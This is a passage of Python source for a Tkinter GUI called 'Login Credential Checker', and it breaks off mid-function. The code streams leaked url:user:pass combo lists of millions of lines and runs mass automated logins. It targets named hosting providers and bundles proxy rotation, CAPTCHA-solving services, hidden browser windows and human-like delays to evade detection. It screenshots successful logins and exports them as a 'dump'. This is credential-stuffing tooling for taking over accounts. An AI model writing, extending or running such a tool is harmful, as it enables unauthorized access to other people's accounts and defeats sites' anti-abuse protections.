"""
app.py
------
Main Tkinter GUI — handles 2.5M+ row credential files without freezing.

Key design decisions for large files:
  - File is NEVER fully loaded into RAM. It is streamed line-by-line.
  - The Treeview only shows PAGE_SIZE rows at a time (virtual paging).
  - Table population inserts rows in small batches via after() so the
    UI event loop never blocks.
  - Login checking uses a ThreadPoolExecutor + queue + 150ms poll.
  - Stats (total/ok/fail) are tracked with counters, not list scans.
"""

import json
import os
import queue
import random
import threading
import time
import tkinter as tk
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, as_completed, wait
from pathlib import Path
from tkinter import ttk, filedialog, messagebox, simpledialog
from urllib.parse import urlparse

# Persistent DOM-field settings file (sits next to login_recipe.json)
_DOM_SETTINGS_FILE = Path(__file__).parent.parent.parent / "dom_settings.json"
_ANTI_CAPTCHA_SETTINGS_FILE = Path(__file__).parent.parent.parent / "anti_captcha_settings.json"

from src.parser  import parse_credential_line
from src.proxy_manager import get_proxy_manager
from src.checker import (
    try_login, try_login_manual_captcha, try_login_interactive,
    save_session, load_session_exists, clear_session, SESSION_FILE,
    record_login_actions, try_login_recorded,
    recipe_exists, clear_recipe, RECIPE_FILE,
    get_browser_executable, set_browser_executable,
    get_anticaptcha_api_key, set_anticaptcha_api_key,
    get_use_anticaptcha, set_use_anticaptcha,
    get_minimized_mode, set_minimized_mode,
    clear_form_cache, release_browser_pool,
    try_login_hostpoint_batch, HOSTPOINT_LOGIN_URL, HOSTPOINT_CONCURRENCY,
    try_login_home_pl_batch, HOME_PL_LOGIN_URL, HOME_PL_CONCURRENCY,
    try_login_cyberfolks_batch, CYBERFOLKS_LOGIN_URL, CYBERFOLKS_CONCURRENCY,
    try_login_fast,
)
from src.gui.styles import apply_styles, Tooltip
from collections import defaultdict

# ---------------------------------------------------------------------------
# Fast line-validity check used ONLY during file indexing.
# Goal: decide "is this line a valid credential?" as cheaply as possible
# without calling urlparse() or the full parse_credential_line().
#
# A valid line must contain at least two occurrences of the same separator
# (: | ;) where the first segment looks like a host or URL.
# We capture the host-part so the focus-filter (domain keyword) can be
# applied without a full parse.
# ---------------------------------------------------------------------------
import re as _re

_FAST_HTTP_RE = _re.compile(
    r'^https?://([^/:|;\s]+)',   # group 1 = hostname (port stripped below)
    _re.IGNORECASE,
)
_FAST_SEP_RE = _re.compile(
    r'^[^:|;\s]{3,}'    # first field (host or url) — at least 3 chars
    r'[:|;]'            # separator
    r'[^:|;]*'          # username field (may be empty)
    r'[:|;]'            # separator again
    r'.+$',             # password — must be non-empty
)


def _fast_host(raw_bytes: bytes) -> str | None:
    """
    Return the hostname of the credential line (lowercase, no port),
    or None if the line does not look like a valid credential entry.
    Runs ~10-15x faster than parse_credential_line() + urlparse().
    """
    line = raw_bytes.decode("utf-8", errors="ignore").strip()
    if not line or line.startswith("#"):
        return None
    # Must have sep:user:pass structure
    if not _FAST_SEP_RE.match(line):
        return None
    # Extract host
    m = _FAST_HTTP_RE.match(line)
    if m:
        host = m.group(1).lower()
        return host.split(":")[0]   # strip port if present
    # No scheme — host is before the first separator
    host = line.replace(";", ":").replace("|", ":").split(":")[0].lower()
    return host

# ---------------------------------------------------------------------------
# Deduplication helpers used during file indexing.
# A credential is a duplicate if (normalized_domain, username, password)
# matches an already-seen entry.  www.xyz is treated as equal to xyz.
# ---------------------------------------------------------------------------
_DEDUP_RE = _re.compile(
    r'^(?:https?://)?'        # optional http/https scheme
    r'([^/:|;\s]+)'           # hostname (may be followed by port/path, stripped below)
    r'(?::\d{1,5})?'          # optional :port (digits only)
    r'(?:/[^:|;]*)?'          # optional /path
    r'([:|;])'                # field separator (captured for backreference)
    r'([^:|;]*)'              # username
    r'\2'                     # SAME separator (backreference — matches parse_credential_line)
    r'(.+)$',                 # password
    _re.IGNORECASE,
)


def _normalize_domain(host: str) -> str:
    """Strip leading 'www.' so www.xyz and xyz are treated as the same domain."""
    h = host.lower()
    return h[4:] if h.startswith("www.") else h


def _fast_dedup_key(raw_bytes: bytes) -> tuple[str, str, str] | None:
    """
    Return (normalized_domain, username, password) for deduplication.
    Returns None if the line is malformed.
    Does NOT call urlparse() — suitable for tight 8 MiB chunk loops.
    """
    line = raw_bytes.decode("utf-8", errors="ignore").strip()
    if not line or line.startswith("#"):
        return None
    m = _DEDUP_RE.match(line)
    if not m:
        return None
    host = _normalize_domain(m.group(1).split("/")[0])  # drop any stray path
    return (host, m.group(3), m.group(4))              # group(2) is the separator

# --- Tuning knobs ---
PAGE_SIZE    = 500    # rows shown in the table at once
BATCH_INSERT = 200    # rows inserted per after() tick (keeps UI smooth)
POLL_MS      = 150    # queue poll interval in milliseconds
CONCURRENCY  = 3      # parallel browser instances during Check All (non-Hostpoint)
SEARCH_INITIAL_RENDER_LIMIT = 100  # keep first paint small on huge result sets


class App(tk.Tk):
    """Root application window — large-file safe."""

    def __init__(self):
        super().__init__()
        self.title("Login Credential Checker")
        self.geometry("1100x680")
        self.minsize(860, 520)

        self.protocol("WM_DELETE_WINDOW", self._on_close)

        self._palette = apply_styles(self)

        # --- Data store ---
        # Only the current PAGE is held in memory for display.
        # Results are stored as {abs_line_index: status_string}.
        self._filepath: str | None = None
        self._total_lines   = 0
        self._page_index    = 0
        self._page_rows: list[dict] = []

        # Persisted results: {abs_idx: status}
        self._results: dict[int, str] = {}

        # Byte-offset index built when a file is loaded.
        # _line_index[abs_idx] = byte offset in the file for that valid line.
        # Enables O(1) seek-based page loads instead of scanning from line 0.
        self._line_index: list[int] = []

        # Manually-added credentials (not from file).
        # Each entry is a dict with keys: url, username, password, domain, status
        # They get negative abs_idx keys: -1, -2, -3, …
        self._manual_entries: list[dict] = []

        # Notes for each credential: {abs_idx: note_string}
        self._notes: dict[int, str] = {}

        # Stats counters
        self._cnt_ok      = 0
        self._cnt_fail    = 0
        self._cnt_unknown = 0

        # Checker state
        self._stop_flag   = threading.Event()
        self._pause_flag  = threading.Event()   # set = paused, clear = running
        self._result_queue: queue.Queue = queue.Queue()
        self._poll_id     = None
        self._total_jobs  = 0
        self._done_jobs   = 0
        self._checking    = False
        self._anti_captcha_alerted_messages: set[str] = set()
        self._check_start_abs_idx = -1   # -1 means start from beginning
        self._consecutive_unreachable = 0
        self._auto_stop_unreachable_var = tk.BooleanVar(value=True)
        self._auto_stop_unreachable_limit_var = tk.IntVar(value=10)
        self._auto_stop_unreachable_warned = False
        self._screenshot_win      = None   # singleton screenshot modal
        self._screenshot_navigate = None   # callable(idx) to jump slides in open modal

        # Timer state — tracks active (non-paused) elapsed run time
        self._check_start_time: float | None = None
        self._paused_seconds:   float        = 0.0
        self._pause_started_at: float | None = None

        # Search state
        self._search_results: list[dict] | None = None
        self._search_page    = 0       # current page within search results
        self._search_queue: queue.Queue = queue.Queue()
        self._search_stop_flag = threading.Event()
        self._search_poll_id   = None
        self._group_by_domain_var = tk.BooleanVar(value=False)
        self._grouped_main_index_cache: list[int] | None = None
        self._grouped_main_index_cache_key: tuple[str, int] | None = None

        # Filter-result cache — list of abs_idx values that pass ALL active
        # filters (domain, url_kw, username_mode).  None = not built yet.
        # Rebuilt in a background thread; reused by search display, Check All,
        # and Save Dump to avoid re-scanning the full file repeatedly.
        self._filtered_index: list[int] | None = None
        # Key snapshot used to build _filtered_index.
        # Tuple of (domain, url_kw, username_mode).
        # When current filter key != _filter_cache_key the cache is stale.
        self._filter_cache_key: tuple = ()
        # Flag set while _rebuild_filter_cache() is running so we don't
        # launch duplicate background rebuilds.
        self._filter_cache_building = False

        # Concurrency: number of parallel browser workers during Check All.
        # Exposed as a UI spinbox; default matches the module constant.
        self._concurrency_var = tk.IntVar(value=CONCURRENCY)
        # Whether duplicate credentials are removed while indexing a file.
        self._dedup_on_load_var = tk.BooleanVar(value=True)
        # When enabled with dedup, save removed duplicate rows to a file.
        self._save_removed_list_var = tk.BooleanVar(value=False)

        # ── Fast Mode settings ────────────────────────────────────────────
        self._fast_mode_var = tk.BooleanVar(value=False)
        self._fast_delay_var = tk.DoubleVar(value=2.0)

        # ── DOM field settings (HTML snippets → CSS selectors) ────────────
        self._dom_cookie_var = tk.StringVar(value="")
        self._dom_user_var   = tk.StringVar(value="")
        self._dom_pass_var   = tk.StringVar(value="")
        self._dom_submit_var = tk.StringVar(value="")
        self._dom_logout_var = tk.StringVar(value="")
        self._dom_login_trigger_var = tk.StringVar(value="")
        self._dom_login_tab_var = tk.StringVar(value="")
        self._load_dom_settings()

        # ── Multi login URL map (domain -> login URL) ─────────────────────
        # Raw text format (one mapping per line), e.g.:
        #   example.com=https://example.com/login
        self._login_url_map_var = tk.StringVar(value="")

        # ── Anti-Captcha settings ────────────────────────────────────────
        self._use_anticaptcha_var = tk.BooleanVar(value=get_use_anticaptcha())
        self._anticaptcha_api_key_var = tk.StringVar(value=get_anticaptcha_api_key())
        self._load_anticaptcha_settings()
        set_use_anticaptcha(self._use_anticaptcha_var.get())
        set_anticaptcha_api_key(self._anticaptcha_api_key_var.get())

        # ── Auto-screenshot settings (Checker tab) ────────────────────────
        # Which result states trigger an automatic screenshot during Check All.
        # Values: "disabled" | "SUCCESS" | "FAILED" | "Both"
        self._screenshot_on_var = tk.StringVar(value="Both")
        # Collected screenshots: list of {entry, jpeg_bytes, status}
        self._checker_screenshots: list[dict] = []
        # Fast lookup: abs_idx → jpeg_bytes for per-row view button
        self._checker_screenshot_map: dict[int, bytes] = {}

        # Proxy manager reference
        self._proxy_mgr = get_proxy_manager()

        self._build_toolbar()
        self._build_url_bar()
        self._build_notebook()
        self._build_status_bar()

    # ================================================================
    # UI builders
    # ================================================================

    def _build_toolbar(self):
        C   = self._palette
        bar = ttk.Frame(self)
        bar.pack(fill="x", padx=12, pady=(12, 4))

        self._file_var = tk.StringVar(value="No file selected")
        ttk.Button(bar, text="Open File", command=self._open_file).pack(side="left")
        ttk.Label(bar, textvariable=self._file_var,
                  foreground=C["green"]).pack(side="left", padx=10)

        self._btn_check  = ttk.Button(bar, text="Check All",
                                      command=self._start_check, state="disabled")
        self._btn_stop   = ttk.Button(bar, text="Stop",
                                      command=self._stop_check,  state="disabled")
        self._btn_pause  = ttk.Button(bar, text="⏸ Pause",
                                      command=self._toggle_pause, state="disabled")
        self._btn_clear  = ttk.Button(bar, text="Clear",
                                      command=self._clear,       state="disabled")
        self._btn_export = ttk.Button(bar, text="Export Results",
                                      command=self._export,      state="disabled")
        self._btn_dump   = ttk.Button(bar, text="Save as Dump",
                                      command=self._save_dump,   state="disabled")

        for btn in (self._btn_check, self._btn_stop, self._btn_pause,
                    self._btn_clear, self._btn_export, self._btn_dump):
            btn.pack(side="left", padx=4)

        ttk.Separator(bar, orient="vertical").pack(side="left", fill="y", padx=8, pady=4)
        self._dedup_label_var = tk.StringVar(value="")
        _dedup_cb = ttk.Checkbutton(
            bar,
            textvariable=self._dedup_label_var,
            variable=self._dedup_on_load_var,
        )
        _dedup_cb.pack(side="left", padx=(0, 6))
        self._save_removed_label_var = tk.StringVar(value="")
        _save_removed_cb = ttk.Checkbutton(
            bar,
            textvariable=self._save_removed_label_var,
            variable=self._save_removed_list_var,
        )
        _save_removed_cb.pack(side="left", padx=(0, 6))
        def _sync_toolbar_toggle_labels(*_):
            self._dedup_label_var.set(
                f"Remove duplicates: {'ON' if self._dedup_on_load_var.get() else 'OFF'}"
            )
            self._save_removed_label_var.set(
                f"Save removed list: {'ON' if self._save_removed_list_var.get() else 'OFF'}"
            )
        self._dedup_on_load_var.trace_add("write", _sync_toolbar_toggle_labels)
        self._save_removed_list_var.trace_add("write", _sync_toolbar_toggle_labels)
        _sync_toolbar_toggle_labels()

        Tooltip(self._btn_check,  "Run login check on all (filtered) credentials")
        Tooltip(self._btn_stop,   "Stop the running check")
        Tooltip(self._btn_pause,  "Pause / resume the check")
        Tooltip(self._btn_clear,  "Reset all check results")
        Tooltip(self._btn_export, "Export checked results to CSV")
        Tooltip(self._btn_dump,   "Save only SUCCESS results to a new file")
        Tooltip(
            _dedup_cb,
            "When enabled, duplicate credentials are removed while opening the file",
        )
        Tooltip(
            _save_removed_cb,
            "When enabled, removed duplicate rows are saved to <filename>.removed.txt",
        )

        # --- Right side: Session controls ---
        ttk.Separator(bar, orient="vertical").pack(side="left", fill="y", padx=10, pady=4)

        self._btn_clear_session = ttk.Button(
            bar, text="Clear Session",
            command=self._clear_session_ui)
        self._btn_clear_session.pack(side="left", padx=4)

    def _build_url_bar(self):
        C = self._palette

        # ── Outer container — fills window width, grid rows stack vertically ──
        outer = ttk.Frame(self)
        outer.pack(fill="x", padx=12, pady=(0, 4))
        outer.columnconfigure(0, weight=1)   # single column, stretches full width

        # ── Row 0: Login URL ────────────────────────────────────────────────
        r0 = ttk.Frame(outer)
        r0.grid(row=0, column=0, sticky="ew", pady=(0, 2))
        r0.columnconfigure(1, weight=1)

        ttk.Label(r0, text="Login URL:").grid(row=0, column=0, sticky="w", padx=(0, 3))
        self._login_url_var = tk.StringVar(value="")
        _login_entry = ttk.Entry(r0, textvariable=self._login_url_var)
        _login_entry.grid(row=0, column=1, sticky="ew", padx=(0, 4))
        self._login_url_var.trace_add("write", lambda *_: clear_form_cache())
        Tooltip(_login_entry, "Custom login page URL — leave blank to use the URL from each credential")

        # ── Row 1: Success URL + Success DOM (same row) ─────────────────────
        r1 = ttk.Frame(outer)
        r1.grid(row=1, column=0, sticky="ew", pady=(0, 2))
        r1.columnconfigure(1, weight=2)
        r1.columnconfigure(4, weight=3)

        ttk.Label(r1, text="Success URL:").grid(row=0, column=0, sticky="w", padx=(0, 3))
        self._success_url_var = tk.StringVar(value="")
        _success_entry = ttk.Entry(r1, textvariable=self._success_url_var)
        _success_entry.grid(row=0, column=1, sticky="ew", padx=(0, 4))
        Tooltip(_success_entry, "URL that signals a successful login — leave blank for auto-detection")

        self._success_exact_var = tk.BooleanVar(value=True)
        self._success_exact_label_var = tk.StringVar(value="")
        _exact_cb = ttk.Checkbutton(r1, textvariable=self._success_exact_label_var, variable=self._success_exact_var)
        _exact_cb.grid(row=0, column=2, sticky="w", padx=(0, 8))
        def _sync_success_exact_label(*_):
            self._success_exact_label_var.set(
                f"Exact URL: {'ON' if self._success_exact_var.get() else 'OFF'}"
            )
        self._success_exact_var.trace_add("write", _sync_success_exact_label)
        _sync_success_exact_label()
        Tooltip(_exact_cb, "Exact match: success only if the final URL equals the Success URL exactly")

        ttk.Label(r1, text="Success DOM:").grid(row=0, column=3, sticky="w", padx=(0, 3))
        self._success_dom_var = tk.StringVar(value="")
        self._success_dom_entry = ttk.Entry(r1, textvariable=self._success_dom_var)
        self._success_dom_entry.grid(row=0, column=4, sticky="ew", padx=(0, 4))
        Tooltip(self._success_dom_entry,
                'Paste an HTML snippet of an element that appears only after login, '
                'e.g.  <div class="stats-block">  — checked before URL matching')

        # ── Row 2: Browser + Workers + toggles ──────────────────────────────
        r2 = ttk.Frame(outer)
        r2.grid(row=2, column=0, sticky="ew", pady=(0, 2))
        r2.columnconfigure(1, weight=1)   # browser path entry expands

        ttk.Label(r2, text="Browser:").grid(row=0, column=0, sticky="w", padx=(0, 3))
        self._browser_exe_var = tk.StringVar(value=get_browser_executable())
        browser_entry = ttk.Entry(r2, textvariable=self._browser_exe_var)
        browser_entry.grid(row=0, column=1, sticky="ew", padx=(0, 4))
        Tooltip(browser_entry, "Path to Chrome / Edge / Brave — leave blank to use Playwright's bundled Chromium")

        def _browse_browser():
            path = filedialog.askopenfilename(
                title="Select browser executable",
                filetypes=[("Executable files", "*.exe"), ("All files", "*.*")],
                initialdir=r"C:\Program Files",
            )
            if path:
                self._browser_exe_var.set(path)
                set_browser_executable(path)
                self._statusbar.config(text=f"Browser set to: {path}")

        def _on_browser_entry_change(*_):
            set_browser_executable(self._browser_exe_var.get())

        self._browser_exe_var.trace_add("write", _on_browser_entry_change)

        col = 2
        ttk.Button(r2, text="Browse…", command=_browse_browser).grid(
            row=0, column=col, sticky="w", padx=(0, 6)); col += 1

        ttk.Separator(r2, orient="vertical").grid(
            row=0, column=col, sticky="ns", padx=4, pady=2); col += 1

        ttk.Label(r2, text="Workers:").grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1
        _workers_spin = ttk.Spinbox(r2, from_=1, to=20, width=4,
                                    textvariable=self._concurrency_var)
        _workers_spin.grid(row=0, column=col, sticky="w", padx=(0, 6)); col += 1
        Tooltip(_workers_spin, "Number of parallel browser instances during Check All")

        ttk.Separator(r2, orient="vertical").grid(
            row=0, column=col, sticky="ns", padx=4, pady=2); col += 1

        self._use_anti_label_var = tk.StringVar(value="")
        _use_anti_cb = ttk.Checkbutton(
            r2, textvariable=self._use_anti_label_var, variable=self._use_anticaptcha_var
        )
        _use_anti_cb.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
        ttk.Label(r2, text="Anti-Captcha Key:").grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1
        anti_key_entry = ttk.Entry(r2, textvariable=self._anticaptcha_api_key_var, show="*", width=24)
        anti_key_entry.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
        _show_anti_key = tk.BooleanVar(value=False)
        def _toggle_anti_key():
            anti_key_entry.config(show="" if _show_anti_key.get() else "*")
        self._show_anti_key_label_var = tk.StringVar(value="")
        _show_anti_cb = ttk.Checkbutton(r2, textvariable=self._show_anti_key_label_var, variable=_show_anti_key, command=_toggle_anti_key)
        _show_anti_cb.grid(
            row=0, column=col, sticky="w", padx=(0, 4)
        ); col += 1
        def _sync_show_anti_label(*_):
            self._show_anti_key_label_var.set(f"Show key: {'ON' if _show_anti_key.get() else 'OFF'}")
        _show_anti_key.trace_add("write", _sync_show_anti_label)
        _sync_show_anti_label()
        def _on_anti_key_change(*_):
            set_anticaptcha_api_key(self._anticaptcha_api_key_var.get())
            self._save_anticaptcha_settings()
        self._anticaptcha_api_key_var.trace_add("write", _on_anti_key_change)
        def _sync_anti_controls(*_):
            enabled = self._use_anticaptcha_var.get()
            self._use_anti_label_var.set(f"Use Anti-Captcha: {'ON' if enabled else 'OFF'}")
            anti_key_entry.configure(state=("normal" if enabled else "disabled"))
            _show_anti_cb.configure(state=("normal" if enabled else "disabled"))
            set_use_anticaptcha(enabled)
            self._save_anticaptcha_settings()
        self._use_anticaptcha_var.trace_add("write", _sync_anti_controls)
        _sync_anti_controls()
        Tooltip(anti_key_entry, "Anti-Captcha API key used for automatic CAPTCHA solving")

        ttk.Separator(r2, orient="vertical").grid(
            row=0, column=col, sticky="ns", padx=4, pady=2); col += 1

        self._minimized_mode_var = tk.BooleanVar(value=get_minimized_mode())
        def _on_minimized_mode_toggle(*_):
            set_minimized_mode(self._minimized_mode_var.get())
            state = "on" if self._minimized_mode_var.get() else "off"
            self._statusbar.config(text=f"Minimized browser mode {state}")
        self._minimized_mode_var.trace_add("write", _on_minimized_mode_toggle)
        self._minimized_mode_label_var = tk.StringVar(value="")
        _min_cb = ttk.Checkbutton(r2, textvariable=self._minimized_mode_label_var, variable=self._minimized_mode_var)
        _min_cb.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
        def _sync_minimized_label(*_):
            self._minimized_mode_label_var.set(
                f"Minimized: {'ON' if self._minimized_mode_var.get() else 'OFF'}"
            )
        self._minimized_mode_var.trace_add("write", _sync_minimized_label)
        _sync_minimized_label()
        Tooltip(_min_cb, "Open browser windows off-screen so they don't appear on your desktop")

        ttk.Separator(r2, orient="vertical").grid(
            row=0, column=col, sticky="ns", padx=4, pady=2); col += 1

        ttk.Label(r2, text="Screenshot:").grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1
        _ss_combo = ttk.Combobox(
            r2, textvariable=self._screenshot_on_var,
            values=["disabled", "SUCCESS", "FAILED", "UNKNOWN", "CAPTCHA", "Both", "All"],
            state="readonly", width=9)
        _ss_combo.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
        Tooltip(_ss_combo, "Which result states trigger an automatic screenshot")

        self._btn_view_screenshots = ttk.Button(
            r2, text="📷 View", command=self._show_checker_screenshots, state="disabled")
        self._btn_view_screenshots.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1

        # ── Row 3: Proxy + Settings buttons + Fast Mode ──────────────────────
        r3 = ttk.Frame(outer)
        r3.grid(row=3, column=0, sticky="ew", pady=(0, 2))

        col = 0
        ttk.Button(r3, text="🌐 Proxy", command=self._open_proxy_dialog).grid(
            row=0, column=col, sticky="w", padx=(0, 4)); col += 1
        ttk.Button(r3, text="🎯 DOM Settings", command=self._open_dom_settings_dialog).grid(
            row=0, column=col, sticky="w", padx=(0, 4)); col += 1

        ttk.Separator(r3, orient="vertical").grid(
            row=0, column=col, sticky="ns", padx=4, pady=2); col += 1

        ttk.Label(r3, text="Proxy:").grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1
        self._proxy_display_var = tk.StringVar(value="No proxy")
        self._proxy_display_lbl = ttk.Label(
            r3, textvariable=self._proxy_display_var,
            foreground=C["yellow"], font=("Segoe UI", 9, "bold"))
        self._proxy_display_lbl.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1

        self._proxy_status_var = tk.StringVar(value="")
        ttk.Label(r3, textvariable=self._proxy_status_var,
                  foreground=C["muted"]).grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1

        ttk.Separator(r3, orient="vertical").grid(
            row=0, column=col, sticky="ns", padx=4, pady=2); col += 1

        self._fast_mode_label_var = tk.StringVar(value="")
        _fast_cb = ttk.Checkbutton(r3, textvariable=self._fast_mode_label_var, variable=self._fast_mode_var)
        _fast_cb.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
        def _sync_fast_mode_label(*_):
            self._fast_mode_label_var.set(f"Fast Mode: {'ON' if self._fast_mode_var.get() else 'OFF'}")
        self._fast_mode_var.trace_add("write", _sync_fast_mode_label)
        _sync_fast_mode_label()
        Tooltip(_fast_cb, "Fast mode: single JS round-trip field detection, no wait_for_selector overhead")

        ttk.Label(r3, text="Delay:").grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1
        _delay_spin = ttk.Spinbox(r3, from_=0.5, to=10.0, increment=0.5,
                                  width=5, textvariable=self._fast_delay_var)
        _delay_spin.grid(row=0, column=col, sticky="w", padx=(0, 2)); col += 1
        Tooltip(_delay_spin, "Pre-submit pause in seconds (simulates human typing speed)")
        ttk.Label(r3, text="sec", foreground=C["muted"]).grid(
            row=0, column=col, sticky="w"); col += 1

        ttk.Separator(r3, orient="vertical").grid(
            row=0, column=col, sticky="ns", padx=4, pady=2); col += 1

        self._auto_unreach_label_var = tk.StringVar(value="")
        _auto_unreach_cb = ttk.Checkbutton(
            r3,
            textvariable=self._auto_unreach_label_var,
            variable=self._auto_stop_unreachable_var,
        )
        _auto_unreach_cb.grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1

        ttk.Label(r3, text="after").grid(row=0, column=col, sticky="w", padx=(0, 2)); col += 1
        _auto_unreach_spin = ttk.Spinbox(
            r3,
            from_=1, to=999,
            width=4,
            textvariable=self._auto_stop_unreachable_limit_var,
        )
        _auto_unreach_spin.grid(row=0, column=col, sticky="w", padx=(0, 2)); col += 1
        ttk.Label(r3, text="hits", foreground=C["muted"]).grid(
            row=0, column=col, sticky="w"); col += 1

        def _sync_unreachable_autostop_ui(*_):
            _auto_unreach_spin.configure(
                state=("normal" if self._auto_stop_unreachable_var.get() else "disabled")
            )
            self._auto_unreach_label_var.set(
                f"Auto-stop unreachable: {'ON' if self._auto_stop_unreachable_var.get() else 'OFF'}"
            )

        self._auto_stop_unreachable_var.trace_add("write", _sync_unreachable_autostop_ui)
        _sync_unreachable_autostop_ui()
        Tooltip(
            _auto_unreach_cb,
            "When enabled, stop Check All after N consecutive UNREACHABLE results",
        )
        Tooltip(
            _auto_unreach_spin,
            "Number of consecutive UNREACHABLE results required before auto-stop",
        )

    def _build_notebook(self):
        """Create the main ttk.Notebook that holds the Checker tab."""
        self._notebook = ttk.Notebook(self)
        self._notebook.pack(fill="both", expand=True, padx=12, pady=(4, 0))

        # ── Checker tab ───────────────────────────────────────────────────
        self._checker_tab = ttk.Frame(self._notebook)
        self._notebook.add(self._checker_tab, text="  Checker  ")
        self._build_stats_bar()
        self._build_search_bar()
        self._build_table()
        self._build_pager()

    def _build_stats_bar(self):
        C   = self._palette
        bar = ttk.Frame(self._checker_tab)
        bar.pack(fill="x", padx=0, pady=(4, 2))

        self._var_total    = tk.StringVar(value="Total: 0")
        self._var_ok       = tk.StringVar(value="Success: 0")
        self._var_fail     = tk.StringVar(value="Failed: 0")
        self._var_unknown  = tk.StringVar(value="Unknown: 0")
        self._var_progress = tk.StringVar(value="")
        self._var_elapsed  = tk.StringVar(value="")
        self._var_rate     = tk.StringVar(value="")

        for var, color in [
            (self._var_total,    C["fg"]),
            (self._var_ok,       C["green"]),
            (self._var_fail,     C["red"]),
            (self._var_unknown,  C["yellow"]),
            (self._var_progress, C["accent"]),
            (self._var_elapsed,  C["muted"]),
            (self._var_rate,     C["muted"]),
        ]:
            ttk.Label(bar, textvariable=var, foreground=color).pack(
                side="left", padx=10)

    def _build_search_bar(self):
        C   = self._palette
        bar = ttk.Frame(self._checker_tab)
        bar.pack(fill="x", padx=0, pady=(2, 2))

        # Domain
        ttk.Label(bar, text="Domain:").pack(side="left")
        self._domain_var = tk.StringVar(value="")
        ttk.Entry(bar, textvariable=self._domain_var, width=14).pack(side="left", padx=(3, 8))

        # URL contains
        ttk.Label(bar, text="URL contains:").pack(side="left")
        self._url_keyword_var = tk.StringVar(value="")
        ttk.Entry(bar, textvariable=self._url_keyword_var, width=16).pack(side="left", padx=(3, 8))

        # Status
        ttk.Label(bar, text="Status:").pack(side="left")
        self._status_filter = tk.StringVar(value="All")
        ttk.Combobox(bar, textvariable=self._status_filter,
                     values=["All", "Pending", "SUCCESS", "FAILED",
                             "UNKNOWN", "Stopped", "ERROR"],
                     state="readonly", width=10).pack(side="left", padx=(3, 8))

        # Username filter mode
        ttk.Label(bar, text="Username:").pack(side="left")
        self._username_filter_var = tk.StringVar(value="All")
        ttk.Combobox(
            bar,
            textvariable=self._username_filter_var,
            values=["All", "ID Only", "Email Only"],
            state="readonly",
            width=11,
        ).pack(side="left", padx=(3, 8))

        ttk.Checkbutton(
            bar,
            text="Group domains",
            variable=self._group_by_domain_var,
            command=self._on_group_domain_toggle,
        ).pack(side="left", padx=(0, 8))

        # Search / Stop Search / Clear
        self._btn_search = ttk.Button(bar, text="Search", command=self._do_search)
        self._btn_search.pack(side="left", padx=2)

        self._btn_stop_search = ttk.Button(bar, text="Stop Search",
                                           command=self._stop_search, state="disabled")
        self._btn_stop_search.pack(side="left", padx=2)

        self._btn_clear_search = ttk.Button(bar, text="Clear", command=self._clear_search)
        self._btn_clear_search.pack(side="left", padx=2)

        ttk.Separator(bar, orient="vertical").pack(side="left", fill="y", padx=8, pady=2)
        self._btn_unique_domains = ttk.Button(
            bar, text="Unique Domains", command=self._show_unique_domains, state="disabled")
        self._btn_unique_domains.pack(side="left", padx=2)

        # Bind Enter on all entries
        for var_entry in bar.winfo_children():
            if isinstance(var_entry, ttk.Entry):
                var_entry.bind("<Return>", lambda _: self._do_search())

    @staticmethod
    def _parse_login_url_map(raw: str) -> dict[str, str]:
        """Parse domain->login_url lines into a dictionary.

        Supported formats per line:
          domain.com=https://domain.com/login
          domain.com,https://domain.com/login
          domain.com https://domain.com/login
        """
        result: dict[str, str] = {}
        if not raw:
            return result

        for line in raw.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            domain = ""
            login_url = ""
            if "=" in line:
                domain, login_url = line.split("=", 1)
            elif "," in line:
                domain, login_url = line.split(",", 1)
            elif " " in line:
                domain, login_url = line.split(None, 1)
            else:
                continue

            domain = domain.strip().lower()
            login_url = login_url.strip()
            if not domain or not login_url:
                continue
            if not login_url.startswith("http"):
                login_url = "https://" + login_url
            result[domain] = login_url
        return result

    def _resolve_login_url_for_entry(
        self,
        entry: dict,
        default_login_url: str = "",
        domain_map: dict[str, str] | None = None,
    ) -> str:
        """Resolve per-entry login URL from the single Login URL field only."""
        return (default_login_url or "").strip()

    def _open_login_url_map_dialog(self):
        """Edit domain-specific login URLs used during checks."""
        C = self._palette

        dlg = tk.Toplevel(self)
        dlg.title("Domain Login URLs")
        dlg.geometry("760x520")
        dlg.configure(bg=C["bg"])
        dlg.transient(self)
        dlg.grab_set()

        ttk.Label(
            dlg,
            text=("Domain -> Login URL mappings (one per line).\n"
                  "Formats: domain=url  OR  domain,url  OR  domain url"),
            foreground=C["muted"],
            justify="left",
        ).pack(anchor="w", padx=12, pady=(12, 6))

        text_frame = ttk.Frame(dlg)
        text_frame.pack(fill="both", expand=True, padx=12, pady=(0, 8))

        mapping_text = tk.Text(
            text_frame,
            bg=C["surface"], fg=C["fg"],
            insertbackground=C["fg"],
            font=("Consolas", 10),
            wrap="none",
            relief="flat",
            borderwidth=2,
        )
        sb = ttk.Scrollbar(text_frame, orient="vertical", command=mapping_text.yview)
        mapping_text.configure(yscrollcommand=sb.set)
        mapping_text.pack(side="left", fill="both", expand=True)
        sb.pack(side="right", fill="y")
        mapping_text.insert("1.0", self._login_url_map_var.get())

        count_var = tk.StringVar(value="0 mapping(s)")
        ttk.Label(dlg, textvariable=count_var, foreground=C["accent"]).pack(
            anchor="w", padx=12, pady=(0, 8)
        )

        def _update_count(*_):
            parsed = self._parse_login_url_map(mapping_text.get("1.0", "end"))
            count_var.set(f"{len(parsed)} mapping(s)")

        _update_count()
        mapping_text.bind("<KeyRelease>", _update_count)

        btns = ttk.Frame(dlg)
        btns.pack(fill="x", padx=12, pady=(0, 12))

        def _apply():
            raw = mapping_text.get("1.0", "end").strip()
            parsed = self._parse_login_url_map(raw)
            self._login_url_map_var.set(raw)
            clear_form_cache()
